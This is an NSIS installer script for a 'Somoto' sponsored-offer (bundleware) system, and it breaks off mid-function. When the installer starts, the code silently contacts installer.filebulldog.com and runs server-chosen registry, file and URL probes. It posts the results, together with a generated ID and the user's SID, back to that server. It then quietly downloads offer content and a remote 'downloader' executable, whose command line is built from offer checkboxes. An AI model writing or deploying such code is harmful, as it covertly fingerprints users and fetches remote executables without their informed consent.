!define BINSIS_VERSION '1.0.1'
!echo "Somoto Better installer NSIS Offering System v${BINSIS_VERSION}"
!verbose push
!verbose 3
!ifndef MUI_INCLUDED
!error "MUI2.h Must be included before the ${__FILE__}" 
!endif
!AddPluginDir extra
!AddIncludeDir extra
!include xml.nsh
!include "StrFunc.nsh"
${StrRep}
${StrLoc}
!macro _MulDiv x y z
System::Call `kernel32::MulDiv(i ${x}, i ${y},i ${z})i .s`
!macroend
!macro GETDLG_BASEUNIT_X
System::Call `user32::GetDialogBaseUnits() i .r0`
IntOP $0 $0 & 0x0000FFFF
!macroend
!macro PX2DLU_X _VAR_
Push $0
!insertmacro GETDLG_BASEUNIT_X
!insertmacro _MulDiv ${_VAR_} 4 $0
Exch
Pop $0
!macroend
!macro PX2DLU_Y _VAR_
Push $0
System::Call `user32::GetDialogBaseUnits() i .r0`
IntOP $0 $0 >> 16
!insertmacro _MulDiv ${_VAR_} 8 $0
Exch
Pop $0
!macroend
!macro DLU2PX_X _VAR_
Push $0
!insertmacro GETDLG_BASEUNIT_X
!insertmacro _MulDiv ${_VAR_} $0 4
Exch
Pop $0
!macroend
!define SAMA_TMP 1
!define SAMA 1
!macro INCREMENT_LBL_COUNTER
!undef SAMA_TMP
!define /math SAMA_TMP ${SAMA} + 1
!undef SAMA
!define SAMA ${SAMA_TMP}
!macroend
!define BINSIS_INTERNET_TIMEOUT 2000
!define CONTROL_WIDTH   10
!define CONTROL_HEIGHT  10
!macro BINSIS_ADVANCED_CONFIG
!ifndef REMOTE_XML
!ifndef BINSIS_USE_LOCAL_CONFIG
!define REMOTE_XML  $TEMP/binsis142.xml
!else
!define REMOTE_XML  ${BINSIS_USE_LOCAL_CONFIG}
!endif 
!endif
!ifndef CLIENT_CHECK_XML
!ifndef BINSIS_USE_LOCAL_CHECK_XML
!define CLIENT_CHECK_XML $TEMP/binsischeck654.xml
!else
!define CLIENT_CHECK_XML ${BINSIS_USE_LOCAL_CHECK_XML}
!endif
!endif
!ifndef OFFER_PAGE_FONT
!define OFFER_PAGE_FONT MS Shell Dlg 2
!endif 
!ifndef OPTION_V_SPACING
!define OPTION_V_SPACING        10
!endif
!ifndef SUB_OPTION_V_SPACING
!define SUB_OPTION_V_SPACING    12
!endif
!ifndef OPTION_LEFT_INDENT
!define OPTION_LEFT_INDENT  0
!endif
!ifndef SUB_OPTION_LEFT_INDENT
!define SUB_OPTION_LEFT_INDENT 12
!endif
!ifndef IMAGE_OPTION_V_SPACING
!define IMAGE_OPTION_V_SPACING 10
!endif 
!define MY_FONT "MS Shell Dlg 2"
!macroend
Var download_url
Var execution_arguments
Var OfferWnd
Var offer.y
Var offer.x
Var offer.image_height
Var offer.cmd_line
Var offer.uid
Var offer.id
Var offer.ready
Var offer.image
Var offer.downloader.en
Var offer.downloader.exe
Var offer.downloader.args
Var offer.downloader.url
Var offer.downloader.init
Var offer.disabled
Var d_g
Var options_root
!macro INIT_VARIABLES
StrCpy $offer.image_height 0
StrCpy $execution_arguments "_iS8gHCbXu^7"
StrCpy $offer.id ""
StrCpy $offer.ready 0
StrCpy $offer.downloader.exe ""
StrCpy $offer.downloader.init '1'
StrCpy $offer.downloader.en '0'
StrCpy $offer.disabled 0
!macroend
!macro SET_TEXT_TO_VAR _VAR_
Push $0
Push $1
${xml::GetText} $0 $1
IntCmp $1 0 +2
StrCpy $0 ""
Pop $1
Exch $0
Pop ${_VAR_}
!macroend
Function PushCurrentNode
Push $0
${xml::NodeHandle} $0
Exch $0
FunctionEnd
Function PopCurrentNode
Exch $0
Push $1
${xml::GotoHandle} $0 $1
Pop $1
Pop $0
FunctionEnd
!macro PUSH_CURRENT_NODE
Call PushCurrentNode
!macroend
!macro POP_CURRENT_NODE
Call PopCurrentNode
!macroend
!macro SET_CHILD_TEXT_TO_VAR _CHILD_ _VAR_
!insertmacro PUSH_CURRENT_NODE
${xml::ElementPath} ${_VAR_}
${xml::GotoPath} "${_VAR_}/${_CHILD_}" ${_VAR_}
!insertmacro SET_TEXT_TO_VAR ${_VAR_}
!insertmacro POP_CURRENT_NODE
!macroend
!macro BEGIN_CHILD_NODE_LOOP_EX _TAG_ n
!insertmacro PUSH_CURRENT_NODE
${xml::FirstChild} ${_TAG_} $0 $1 
IntCmp $1 -1 finish_${n} 
loop_${n}:
!macroend
!macro BEGIN_CHILD_NODE_LOOP n
!insertmacro PUSH_CURRENT_NODE
${xml::FirstChild} "" $0 $1 
IntCmp $1 -1 finish_${n} 
loop_${n}:
!macroend
!macro END_CHILD_NODE_LOOP n
${xml::NextSiblingElement} "" $0 $1
IntCmp $1 0 loop_${n} 
finish_${n}:
!insertmacro POP_CURRENT_NODE
!macroend
!ifdef BINSIS_DEBUG
!macro _D T
MessageBox MB_OK '${T}'
!macroend
!else
!macro _D T
!macroend
!endif
!define BD '!insertmacro _D'
!macro BINSIS_HELPER_FUNCTIONS
Function GetTextWidth
Exch $0 
Exch
Exch $4 
Push $1
Push $R7
Push $3
System::Call "User32::GetDC(i $HWNDPARENT) i .r9"
System::Call "Gdi32::CreateCompatibleDC(i r9) i .r1"
System::Call "Gdi32::CreateCompatibleBitmap(i r1,i 1000 ,i 40) i .r2"
System::Call "Gdi32::SelectObject(i r1,i r2)i .R6"
System::Call "Gdi32::SelectObject(i r1,i r4)i .R6"
StrLen $R7 $0
System::Call `*(i 0,i 0)i .R0`
System::Call "Gdi32::GetTextExtentPoint32(i r1,t r0,i R7,i R0)"
System::Call `*$R0(i .R1,i .R2)`
System::Free $R0
IntOp $3 $R7 - 1
StrCpy $3 $0 1 $3
System::Call `*(i 0,i 0)i .R0`    
System::Call "Gdi32::GetTextExtentPoint32(i r1,t r3,i 1,i R0)"
System::Call `*$R0(i .R3,i)`
System::Free $R0
IntOp $R1 $R1 + $R3
System::Call `*(i 0,i 0,i R1,i R2)i .R0`
System::Call "Gdi32::GetStockObject(i 0) i .R3" 
System::Call "User32::FillRect(i r1,i R0,i R3)"
System::Call "Gdi32::SetBkColor(i r1,i 0)"
System::Call "User32::DrawText(i r1,t r0,i R7,i R0,i x00000820)"
System::Call `*$R0(i,i,i.R1,i.R2)`   
System::Free $R0
IntOp $R1 $R1 - 1
IntOp $R2 $R2 - 1
IntOP $R3 $R2 / 2
loop_x:
System::Call "Gdi32::GetPixel(i r1,i R1,i R3) i .R5"
IntCmp $R5 0 found
IntOp $R1 $R1 - 1     
IntCmp $R1 0 loop_x 0 loop_x 
found:
System::Call "Gdi32::SelectObject(i r1,i R6)" 
System::Call "Gdi32::DeleteObject(i r2)"
System::Call "Gdi32::DeleteDC(i r1)"
System::Call "User32::ReleaseDC(i $HWNDPARENT,i r9)"  
IntOp $R1 $R1 + 1
StrCpy $0 $R1
IntOp $R2 $R2 + 1
StrCpy $4 $R2
Pop $3         
Pop $R7             
Pop $1
Exch $4 
Exch
Exch $0 
FunctionEnd
Function CreateFontForDecor
Push $4
Push $0
Push $1
Push $2
Push $3
Push $5
StrCpy $5 8 
${xml::GetAttribute} "size" $3 $2
IntCmp $2 -1 use_default_size
IntOp $5 $5 + $3
use_default_size:
StrCpy $0 "500"
${xml::GetAttribute} "bold" $3 $2
IntCmp $2 -1 no_bold
StrCmp $3 "true" 0 no_bold
StrCpy $0 "600" 
no_bold:    
${xml::GetAttribute} "italic" $3 $2
IntCmp $2 -1 no_italic 
StrCmp $3 "true" 0 no_italic
${xml::GetAttribute} "underline" $3 $2
IntCmp $2 -1 no_underline 
StrCmp $3 "true" 0 no_underline
CreateFont $4 '${MY_FONT}' $5 $0 /ITALIC /UNDERLINE
goto end    
no_underline:
CreateFont $4 '${MY_FONT}' $5 $0 /ITALIC
goto end
no_italic:
${xml::GetAttribute} "underline" $3 $2
IntCmp $2 -1 no_underline_2 
StrCmp $3 "true" 0 no_underline_2
CreateFont $4 '${MY_FONT}' $5 $0 /UNDERLINE
goto end
no_underline_2:
CreateFont $4 '${MY_FONT}' $5 $0
end:
Pop $5
Pop $3
Pop $2
Pop $1
Pop $0
Exch $4 
FunctionEnd
Function LinkClicked
Exch $0 
Push $1
Push $8
nsDialogs::GetUserData $0 
Pop $0
!insertmacro PUSH_CURRENT_NODE
${xml::GotoPath} $0 $1
IntCmp $1 -1 error
${xml::GetAttribute} "href" $8 $1
IntCmp $1 -1 error
ExecShell "open" $8 "_blank"
error:
!insertmacro POP_CURRENT_NODE
Pop $8
Pop $1
Pop $0
FunctionEnd
Function OptionClicked
Pop $9 
Push $0
Push $1
Push $3
Push $4
Push $5
${xml::GotoPath} '$options_root' $1
!insertmacro BEGIN_CHILD_NODE_LOOP 'options'
${xml::ElementPath} $0
${FindChildByUserData} $0 $3
IntCmp $3 0 no_wnd
SendMessage $3 ${BM_GETCHECK} 0 0 $5
!insertmacro PUSH_CURRENT_NODE 
${xml::GotoPath} '$0/descendants' $1
IntCmp $1 -1 no_childs 
!insertmacro BEGIN_CHILD_NODE_LOOP 'dopts'
${xml::ElementPath} $4 
${FindChildByUserData} $4 $3
IntCmp $3 0 skip2
${IF} $5 == ${BST_CHECKED}
EnableWindow $3 1
${ELSE}
EnableWindow $3 0    
${ENDIF}
skip2:
!insertmacro END_CHILD_NODE_LOOP 'dopts'
no_childs:
!insertmacro POP_CURRENT_NODE
no_wnd:        
!insertmacro END_CHILD_NODE_LOOP 'options'
Pop $5
Pop $4
Pop $3
Pop $1
Pop $0
FunctionEnd
Function doDecendentOption
${xml::GetAttribute} "type" $0 $1
IntCmp $1 -1 skip1
IntCmp $5 0 skip1 
${IF} $0 == "radio" 
${NSD_CreateRadioButton} '$offer.xu' '$offer.yu' ${CONTROL_WIDTH}u ${CONTROL_HEIGHT}u ""
Pop $3
IntCmp $d_g 1 sm_group
${NSD_AddStyle} $3 ${WS_GROUP}
StrCpy $d_g 1
sm_group:
${ELSE}
${NSD_CreateCheckBox} '$offer.xu' '$offer.yu' ${CONTROL_WIDTH}u ${CONTROL_HEIGHT}u ""
Pop $3
${ENDIF}        
${xml::ElementPath} $0
nsDialogs::SetUserData $3 $0  
IntOp $offer.x $offer.x + 5 
IntOp $offer.x $offer.x + 1 
!insertmacro BEGIN_CHILD_NODE_LOOP msp
${IF} $0 == "text"
IntCmp $5 0 skip_create2
!insertmacro DLU2PX_X $offer.x
Pop $offer.x
!insertmacro BEGIN_CHILD_NODE_LOOP_EX decor xx78
!insertmacro MAKE_HEADER_FOOTER 0 0
!insertmacro END_CHILD_NODE_LOOP xx78
skip_create2:
${ELSEIF} $0 == "default_state"
!insertmacro SET_TEXT_TO_VAR $2
${IF} $2 == "on"
${NSD_Check} $3
${ENDIF}
${ENDIF}
!insertmacro END_CHILD_NODE_LOOP msp
skip1:
IntOp $offer.y $offer.y + ${SUB_OPTION_V_SPACING}
FunctionEnd
!define stRECT "(i, i, i, i) i"
!define stSIZE "(i, i) i"
!define DESCENDANT_MEASURE_MODE  1
!define DESCENDANT_CREATE_MODE   0
Function enumOption
Exch $5 
Push $0
Push $1
Push $2
Push $3
${xml::GetAttribute} "type" $0 $1
IntCmp $1 -1 skip1
IntCmp $5 1 lbl1
${IF} $0 == "radio" 
${NSD_CreateRadioButton} '$offer.xu' '$offer.yu' ${CONTROL_WIDTH}u 10u ""
Pop $3
IntCmp $d_g 1 sm_group
${NSD_AddStyle} $3 ${WS_GROUP}
StrCpy $d_g 1
sm_group:
${ELSE}
${NSD_CreateCheckBox} '$offer.xu' '$offer.yu' ${CONTROL_WIDTH}u 10u ""
Pop $3
${ENDIF}        
IntOp $offer.x $offer.x + 8
IntOp $offer.x $offer.x + 1
${NSD_OnClick} $3 OptionClicked
${xml::ElementPath} $0
nsDialogs::SetUserData $3 $0
lbl1:
IntOp $offer.y $offer.y + 1
!insertmacro BEGIN_CHILD_NODE_LOOP msp
${IF} $0 == "text" 
!insertmacro DLU2PX_X $offer.x
Pop $R7
StrCpy $offer.x $R7
!insertmacro BEGIN_CHILD_NODE_LOOP_EX decor xx78
!insertmacro MAKE_HEADER_FOOTER $R7 $5
!insertmacro END_CHILD_NODE_LOOP xx78
!insertmacro PX2DLU_Y $R9
Pop $R9
IntOp $offer.y $offer.y + $R9
${ELSEIF} $0 == "default_state"
${ANDIF} $5 == 0
!insertmacro SET_TEXT_TO_VAR $2
${IF} $2 == "on"
${NSD_Check} $3
${ENDIF}
${ELSEIF} $0 == "descendants"
!insertmacro BEGIN_CHILD_NODE_LOOP 'descendants'
StrCpy $offer.x ${OPTION_LEFT_INDENT}
IntOp $offer.x $offer.x + ${SUB_OPTION_LEFT_INDENT}
Call doDecendentOption
!insertmacro END_CHILD_NODE_LOOP 'descendants'
IntOp $offer.y $offer.y - ${SUB_OPTION_V_SPACING}
${ENDIF}
!insertmacro END_CHILD_NODE_LOOP msp
skip1:    
Pop $3
Pop $2
Pop $1
Pop $0
Pop $5
FunctionEnd
Function FindHWNDByUserData
Push $1 
Exch
Exch $0 
Push $2 
System::Get "(i.r1, i) iss"
Pop $R0
System::Call "user32::EnumChildWindows(i $HWNDPARENT, k R0, i)"
loop:
Pop $2 
StrLen $2 $2
IntCmp $2 9 0 done 0
nsDialogs::GetUserData $1
Pop $2
${IF} $2 == $0
Push 0 
System::Call "$R0"
Goto done_found
${ENDIF}
StrCpy $1 0 
Push 1 
System::Call "$R0"       
Goto loop
done:
done_found:    
System::Free $R0
Pop $2    
Pop $0
Exch $1 
FunctionEnd
Function CheckRegistryHint   
Call ExpandMacros 
Exch $0
Exch
Exch $5
Push $1
Push $2
StrCpy $1 0
${StrLoc} $1 $0 "\" ">"
IntCmp $1 2 0 finish 0 
StrCpy $2 $0 $1 
StrLen $4 $0
IntOp $4 $4 - $1 
IntOp $1 $1 + 1
StrCpy $3 $0 $4 $1
ClearErrors
${BD} "chek registry: $2,$3,$5"
StrCpy $0 ""
${IF} $2 == "HKCR"
ReadRegStr $0 HKCR $3 $5
${ELSEIF} $2 == "HKLM"
ReadRegStr $0 HKLM $3 $5
${ELSEIF} $2 == "HKCU"
ReadRegStr $0 HKCU $3 $5
${ELSEIF} $2 == "HKU"
ReadRegStr $0 HKU $3 $5                      
${ENDIF}
${BD} $0
StrCpy $5 0 
IfErrors 0 finish
StrCmp $0 "" 0 finish 
StrCpy $5 1 
finish:
Pop $2    
Pop $1
Exch $5
Exch
Exch $0      
FunctionEnd
Function CheckUrlHint
Call ExpandMacros 
Exch $0
Push $1
inetc::get /SILENT $0 "my.dat" /END
Pop $0
StrCmp $0 "OK" 0 error
ClearErrors
FileOpen $1 "my.dat" r
IfErrors error
FileRead $1 $0  
FileClose $1
Delete "my.dat"
StrCpy $1 0 
Goto done    
error:
StrCpy $0 ""
StrCpy $1 1        
done:
Exch $1
Exch
Exch $0
FunctionEnd
Function CheckFileSystemHint
Call ExpandMacros 
Exch $0
Push $1
IfFileExists $0 0 error
ClearErrors
FileOpen $1 $0 r
IfErrors error
FileRead $1 $0  
FileClose $1
StrCpy $1 0 
Goto done    
error:
StrCpy $0 ""
StrCpy $1 1        
done:
Exch $1
Exch
Exch $0
FunctionEnd
Function CreateUID
Push $2
Push $1
System::Call 'ole32::CoCreateGuid(g .r2)'
StrLen $1 $2 
IntOP $1 $1 - 2
Strcpy $2 $2 $1 1
${StrRep} $2 $2 "-" "" 
Pop $1
Exch $2
FunctionEnd
Function GetIEVersion
Push $R0
ClearErrors
ReadRegStr $R0 HKLM "Software\Microsoft\Internet Explorer" "Version"
IfErrors lbl_123 lbl_4567
lbl_4567: 
Strcpy $R0 $R0 1
Goto lbl_done
lbl_123: 
ClearErrors
ReadRegStr $R0 HKLM "Software\Microsoft\Internet Explorer" "IVer"
IfErrors lbl_error
StrCpy $R0 $R0 3
StrCmp $R0 '100' lbl_ie1
StrCmp $R0 '101' lbl_ie2
StrCmp $R0 '102' lbl_ie2
StrCpy $R0 '3' 
Goto lbl_done
lbl_ie1:
StrCpy $R0 '1'
Goto lbl_done
lbl_ie2:
StrCpy $R0 '2'
Goto lbl_done
lbl_error:
StrCpy $R0 ''
lbl_done:
Exch $R0
FunctionEnd
Function GetUserSID
Push $R1
Push $0
Push $1
Push $2
Push $R8
System::Call "advapi32::GetUserName(t .r0, *i ${NSIS_MAX_STRLEN} r1) i.r2"
System::Call '*(&w${NSIS_MAX_STRLEN})i.R8'
System::Call 'advapi32::LookupAccountNameW(w "",w r0,i R8, *i ${NSIS_MAX_STRLEN}, w .R1, *i ${NSIS_MAX_STRLEN}, *i .r0)i .r1'
System::Call 'advapi32::ConvertSidToStringSid(i R8,*t .R1)i .r0'
System::Free $8
Pop $R8
Pop $2
Pop $1
Pop $0
Exch $R1
FunctionEnd
Function ExpandMacros
Exch $0
Push $1
${StrRep} $0 $0 "%UID%" $offer.uid
${StrRep} $0 $0 "%AffiliateID%" ${BINSIS_AFFID}
${StrRep} $0 $0 "%SoftwareID%" ${BINSIS_SOFTWARE_ID}
${StrRep} $0 $0 "%OfferID%" $offer.id
Call GetUserSID
Pop $1
${StrRep} $0 $0 "%UserSID%" $1
Pop $1
Exch $0
FunctionEnd
!macroend
!macro BINSIS_INIT_FUNCTION
!ifndef BINSIS_INIT_FUNCTION_ADDED
!define BINSIS_INIT_FUNCTION_ADDED
!ifndef BINSIS_AFFID | BINSIS_SOFTWARE_ID
!error 'Did you forget to use INIT_BINSIS ??'
!endif  
!ifdef MUI_CUSTOMFUNCTION_GUIINIT
!define OLD_CUSTOM_GUIINIT  ${MUI_CUSTOMFUNCTION_GUIINIT}
!undef MUI_CUSTOMFUNCTION_GUIINIT
!endif
!define MUI_CUSTOMFUNCTION_GUIINIT BiNSIS_onGUIInit_${BINSIS_SOFTWARE_ID}
Function BiNSIS_onGUIInit_${BINSIS_SOFTWARE_ID}
IntCmp $offer.disabled 1 no_do
StrCpy $offer.disabled 0
StrCpy $0 $HWNDPARENT
System::Call "user32::SetWindowPos(i r0, i -1, i 0, i 0, i 0, i 0, i 3)"
Banner::show "Checking System..."
Call CreateUID
Pop $offer.uid
!ifndef BINSIS_USE_LOCAL_CHECK_XML
IfFileExists ${CLIENT_CHECK_XML} 0 +2
Delete ${CLIENT_CHECK_XML}
inetc::get /silent http://installer.filebulldog.com/binsis/get_pre_offering_checks?uid=$offer.uid&v=${BINSIS_VERSION}&affid=${BINSIS_AFFID}&sid=${BINSIS_SOFTWARE_ID} ${CLIENT_CHECK_XML} /END
Pop $0
StrCmp $0 "OK" 0 abort_offer
!endif
${xml::LoadFile} ${CLIENT_CHECK_XML} $0
IntCmp $0 -1 abort_offer
${xml::GotoPath} "pre_offering_checks" $0
IntCmp $0 -1 abort_offer
StrCpy $9 `"uid":"$offer.uid"`
StrCpy $9 `$9,"affid":"${BINSIS_AFFID}"`
StrCpy $9 `$9,"sid":"${BINSIS_SOFTWARE_ID}"`
StrCpy $9 `$9,"installerVersion":"${BINSIS_VERSION}"`
StrCpy $9 `$9,"osVersion":"${BINSIS_VERSION}"`
call GetIEVersion
Pop $2
StrCpy $9 `$9,"ieVersion":"$2"`
!insertmacro BEGIN_CHILD_NODE_LOOP_EX 'check' xx78z
${xml::GetAttribute} "type" $2 $1
IntCmp $1 -1 +2
StrCpy $R0 1
ClearErrors
StrCpy $3 ""
StrCpy $4 ""
${IF} $2 == "url"
!insertmacro SET_CHILD_TEXT_TO_VAR 'value_to_check' $3
Push $3
Call CheckUrlHint
${ELSEIF} $2 == "registry"
!insertmacro SET_CHILD_TEXT_TO_VAR 'value_to_check/name' $3
!insertmacro SET_CHILD_TEXT_TO_VAR 'value_to_check/key' $4
Push $3 
Push $4
Call CheckRegistryHint
${ELSEIF} $2 == "filesystem"
!insertmacro SET_CHILD_TEXT_TO_VAR 'value_to_check' $3
Push $3
Call CheckFileSystemHint                        
${ELSE} 
Push ""
Push 1
${ENDIF}    
Pop $R1 
Pop $R0 
${BD} 'result $R1, flag $R0'
${xml::GetAttribute} "return_name" $R2 $1
IntCmp $1 -1 skip_check
${xml::GetAttribute} "return_value_type" $R3 $1
IntCmp $1 0 +2
StrCpy $R3 "boolean" 
${IF} $R0 == 0
${IF} $R3 == "actual"
StrCpy $9 `$9,"$R2":"$R1"`
${ELSE}
StrCpy $9 `$9,"$R2":"true"`
${ENDIF}
${ELSE}
${IF} $R3 == "actual"
StrCpy $9 `$9,"$R2":"null"`
${ELSE}
StrCpy $9 `$9,"$R2":"false"`
${ENDIF}   
${ENDIF}
skip_check:                                                  
!insertmacro END_CHILD_NODE_LOOP xx78z
${xml::Unload} 
StrCpy $9 'installer_data={$9}' 
${BD} $9
!ifndef BINSIS_USE_LOCAL_CONFIG
IfFileExists ${REMOTE_XML} 0 +2
Delete ${REMOTE_XML}
inetc::post $9 /silent \
"http://installer.filebulldog.com/binsis/xml?uid=$offer.uid&v=${BINSIS_VERSION} \
&affid=${BINSIS_AFFID}&sid=${BINSIS_SOFTWARE_ID}" ${REMOTE_XML} /END
Pop $0
StrCmp $0 "OK" 0 abort_offer    
!endif
${xml::LoadFile} ${REMOTE_XML} $0
IntCmp $0 -1 abort_offer
${xml::GotoPath} "/sponsored_data/offer" $0
IntCmp $0 -1 abort_offer
${xml::GetAttribute} "id" $offer.id $0
IntCmp $0 -1 abort_offer
!insertmacro BEGIN_CHILD_NODE_LOOP 125
${IF} $0 == 'image_url'
!insertmacro SET_TEXT_TO_VAR $1
StrCmp $1 "" img_error    
GetTempFileName $offer.image
inetc::get /silent $1 $offer.image  /END
Pop $1            
StrCmp $1 "OK" 0 abort_offer
img_error:
${ENDIF}    
!insertmacro END_CHILD_NODE_LOOP 125
StrCpy $offer.downloader.en '0'
${xml::GotoPath} "/sponsored_data/downloader" $0
IntCmp $0 -1 skip_target 
StrCpy $offer.downloader.en '1'
!insertmacro BEGIN_CHILD_NODE_LOOP 126
${IF} $0 == 'downloadOnInit'
!insertmacro SET_TEXT_TO_VAR $offer.downloader.init
${ELSEIF} $0 == "url"
!insertmacro SET_TEXT_TO_VAR $offer.downloader.url
${ELSEIF} $0 == "args"
!insertmacro SET_TEXT_TO_VAR $offer.downloader.args   
${ENDIF}    
!insertmacro END_CHILD_NODE_LOOP 126
StrCmp $offer.downloader.init "0" skip_target
GetTempFileName $offer.downloader.exe                            
inetc::get /silent $offer.downloader.url $offer.downloader.exe /END
Pop $0
StrCmp $0 "OK" 0 abort_offer
${BD} 'external downloadr: $offer.downloader.init'
skip_target:        
!insertmacro _D "Offer is ready,,$offer.downloader.en"
StrCpy $offer.ready 1
abort_offer:      
Banner::destroy
System::Call "user32::SetWindowPos(i r0, i -2, i 0, i 0, i 0, i 0, i 3)"
no_do:    
!ifdef OLD_CUSTOM_GUIINIT
Call ${OLD_CUSTOM_GUIINIT}
!endif
FunctionEnd
!endif    
!macroend
!macro MAKE_HEADER_FOOTER2 _RESET_X _MODE_
!macroend
!macro MAKE_HEADER_FOOTER _RESET_X _MODE_ 
!insertmacro SET_TEXT_TO_VAR $8
Call CreateFontForDecor
Pop $4 
${xml::GetAttribute} "type" $3 $2
${IF} $3 == "link"
Push $4  
Push $8  
Call GetTextWidth
Pop $1 
Pop $R9 
${IF} ${_MODE_} == 0
${NSD_CreateLink} '$offer.x' '$offer.yu' '$1' '$R9'  $8
Pop $9
${xml::ElementPath} $2
nsDialogs::SetUserData $9 $2
${NSD_OnClick} $9 LinkClicked
SendMessage $9 ${WM_SETFONT} $4 1
${ENDIF}
IntOp $offer.x $offer.x + $1
IntOp $offer.x $offer.x + 3 
${ELSEIF} $3 == "text"
Push $4  
Push $8  
Call GetTextWidth
Pop $1 
Pop $R9 
${IF} ${_MODE_} == 0
${NSD_CreateLabel} '$offer.x' '$offer.yu' '$1' '$R9'  $8
Pop $9
SendMessage $9 ${WM_SETFONT} $4 1
${ENDIF}
IntOp $offer.x $offer.x + $1
IntOp $offer.x $offer.x + 2 
${ELSE}
StrCpy $offer.x ${_RESET_X} 
!insertmacro PX2DLU_Y $R9  
Pop $R8
IntOp $offer.y $offer.y + $R8
${xml::GetAttribute} "space" $3 $2
IntCmp $2 -1 +2
IntOp $offer.y $offer.y + $3
StrCpy $R9 0
IntOp $offer.y $offer.y + 1 
${ENDIF}
!macroend        
!macro CREATE_FUNCTION
Function nsSettingsPage
StrCmp $offer.ready "0" skip
${xml::GotoPath} "/sponsored_data/offer" $0
IntCmp $0 -1 skip
StrCpy $offer.y 0 
GetDlgItem $0 $HWNDPARENT 1
EnableWindow $0 0
SendMessage $HWNDPARENT ${WM_SETREDRAW} 0 0
nsDialogs::Create 1018
Pop $OfferWnd
${xml::GotoPath} "/sponsored_data/offer/description" $1
IntCmp $1 -1 skip_desc
StrCpy $offer.x 0
!insertmacro BEGIN_CHILD_NODE_LOOP_EX 'decor' 'offer2desc'
!insertmacro MAKE_HEADER_FOOTER 0 0
!insertmacro END_CHILD_NODE_LOOP 'offer2desc'
!insertmacro PX2DLU_Y $R9
Pop $R9
IntOp $offer.y $offer.y + $R9
IntOp $offer.y $offer.y + 5 
skip_desc:    
${xml::GotoPath} "/sponsored_data/offer" $0
!insertmacro BEGIN_CHILD_NODE_LOOP 'offer'
${IF} $0 == 'title'
GetDlgItem $5 $HWNDPARENT 1037
!insertmacro SET_TEXT_TO_VAR $1
SendMessage $5 ${WM_SETTEXT} 0 "STR:$1"     
${ELSEIF} $0 == 'sub_title'
GetDlgItem $5 $HWNDPARENT 1038
!insertmacro SET_TEXT_TO_VAR $1
SendMessage $5 ${WM_SETTEXT} 0 "STR:$1"     
${ELSEIF} $0 == 'download_url'
!insertmacro SET_TEXT_TO_VAR $download_url
${ELSEIF} $0 == 'execution_arguments'
!insertmacro SET_TEXT_TO_VAR $offer.cmd_line
${ELSEIF} $0 == 'image_url'
StrCmp $offer.image "" img_error
StrCpy $7 $offer.image 
System::Call `user32::LoadImage(i 0, t r7, i ${IMAGE_BITMAP}, i 0, i 0, i ${LR_CREATEDIBSECTION}|${LR_LOADFROMFILE}) i.s`
Pop $9
IntCmp $9 0 img_error
System::Call `gdi32::GetObject(i $9, i 0,i 0) i.s`
Pop $7
System::Alloc $7
Pop $R0
System::Call `gdi32::GetObject(i $9, i r7,i R0) i.s`
Pop $0
System::Call `*$R0(i,i,i .r5,i,i,i,i)`
System::Free $R0 
!insertmacro PX2DLU_Y $5
Pop $offer.image_height 
${NSD_CreateBitmap} 0u '$offer.yu' 100% '$offer.image_heightu'  ""
Pop $2   
SendMessage $2 ${STM_SETIMAGE} ${IMAGE_BITMAP} $9
IntOp $offer.image_height $offer.image_height + ${IMAGE_OPTION_V_SPACING}
img_error:
${ELSEIF} $0 == 'execution_arguments'
!insertmacro SET_TEXT_TO_VAR $execution_arguments 
${ELSEIF} $0 == 'options'
StrCpy $d_g 0
IntOp $offer.y $offer.y + $offer.image_height
Push $offer.y  
${xml::ElementPath} $options_root
!insertmacro BEGIN_CHILD_NODE_LOOP 'options'
Push 0 
StrCpy $offer.x ${OPTION_LEFT_INDENT} 
Call enumOption
IntOp $offer.y $offer.y + ${OPTION_V_SPACING}
!insertmacro END_CHILD_NODE_LOOP 'options'
Pop $offer.y
!insertmacro BEGIN_CHILD_NODE_LOOP 'options2'
Push 1 
StrCpy $d_g 0 
StrCpy $offer.x ${OPTION_LEFT_INDENT} 
Call enumOption
IntOp $offer.y $offer.y + ${OPTION_V_SPACING}
!insertmacro END_CHILD_NODE_LOOP 'options2'
${ENDIF}
!insertmacro END_CHILD_NODE_LOOP 'offer'
${xml::GotoPath} "/sponsored_data/offer/footer" $1
IntCmp $1 -1 skip_footer
!insertmacro PX2DLU_Y $R9
Pop $R9
IntOp $offer.y $offer.y + $R9
${BD} $offer.y
StrCpy $offer.x 0 
!insertmacro BEGIN_CHILD_NODE_LOOP_EX 'decor' 'offer2footer'
!insertmacro MAKE_HEADER_FOOTER 0 0
!insertmacro END_CHILD_NODE_LOOP 'offer2footer'
skip_footer:
Call OptionClicked        
SendMessage $HWNDPARENT ${WM_SETREDRAW} 1 0
System::Call "User32::InvalidateRect(i $HWNDPARENT,i 0,i 0)"
GetDlgItem $0 $HWNDPARENT 1
EnableWindow $0 1
nsDialogs::Show
StrCpy $execution_arguments ""
Return
skip: 
FunctionEnd
!macroend
!macro _FindHWNDByUserData _UserData _Output
Push ${_UserData}
Call FindHWNDByUserData
Pop ${_Output}
!macroend
!define FindChildByUserData  '!insertmacro _FindHWNDByUserData'
!macro TEST_NAYA _PATH_ _VAR_
!insertmacro INCREMENT_LBL_COUNTER
!define MY_LBL ee_${SAMA}
!insertmacro PUSH_CURRENT_NODE
Push $1
Push $2
StrCpy $2 "" 
${xml::GotoPath} ${_PATH_} $1
IntCmp $1 -1 ${MY_LBL} 
${xml::GetText} $2 $1
IntCmp $1 -1 ${MY_LBL} 
${MY_LBL}:    
Push $2 
Exch
Pop $2
Exch    
Pop $1
Pop ${_VAR_}
!insertmacro POP_CURRENT_NODE
!undef MY_LBL  
!macroend
!macro LEAVE_FUNCTION
Function nsSettingsPageLeave
Push $0
Push $1
Push $2
Push $3
Push $4
Push $5
${xml::GotoPath} $options_root $1
!insertmacro BEGIN_CHILD_NODE_LOOP 'options'
${xml::ElementPath} $0
${FindChildByUserData} $0 $3
IntCmp $3 0 no_wnd
SendMessage $3 ${BM_GETCHECK} 0 0 $1
${IF} $1 == ${BST_CHECKED}
!insertmacro TEST_NAYA '$0/state_values/on' $5
StrCpy $offer.cmd_line '$offer.cmd_line $5'
${xml::GotoPath} '$0/descendants' $1
IntCmp $1 -1 no_childs        
!insertmacro BEGIN_CHILD_NODE_LOOP 'dopts'
${xml::ElementPath} $4 
${FindChildByUserData} $4 $3
IntCmp $3 0 skip2
SendMessage $3 ${BM_GETCHECK} 0 0 $1
${IF} $1 == ${BST_CHECKED}
!insertmacro TEST_NAYA '$4/state_values/on' $5
StrCpy $offer.cmd_line '$offer.cmd_line $5'                    
${ELSE}
